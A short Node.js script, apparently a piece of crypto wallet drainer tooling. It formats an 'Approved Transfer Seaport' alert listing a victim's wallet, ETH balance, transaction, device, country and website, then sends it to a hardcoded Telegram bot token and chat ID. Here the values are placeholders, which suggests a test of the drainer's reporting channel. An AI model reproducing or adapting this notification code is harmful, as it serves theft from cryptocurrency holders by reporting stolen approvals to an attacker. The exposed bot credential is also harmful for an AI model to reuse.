const request = require('request');

let message = `*Approved Transfer Seaport*
*Wallet:* ["address"](https://etherscan.io/address/"address")
*Balance: "5000" ETH*
*Type: Seaport*
*Transaction:* [Here](https://etherscan.io/tx/"txid")
*Device:* "Computer" **
*Country: *"Benezuela" **
*Website:* ["websiteDomain"]("pacosanz.com") **`

let clientServerOptions = {
    uri: 'https://api.telegram.org/bot' + "5971661216:AAGwym64wfphRuzZ1Bx7BTcE6fJd4yEj7Zo" + '/sendMessage',
    body: JSON.stringify({chat_id: "5440063715", parse_mode: "MarkdownV2", text: message, disable_web_page_preview: true}),
    method: 'POST',
    headers: {
        'Content-Type': 'application/json'
    }
}

request(clientServerOptions, (error, response) => {
    console.log(error);
});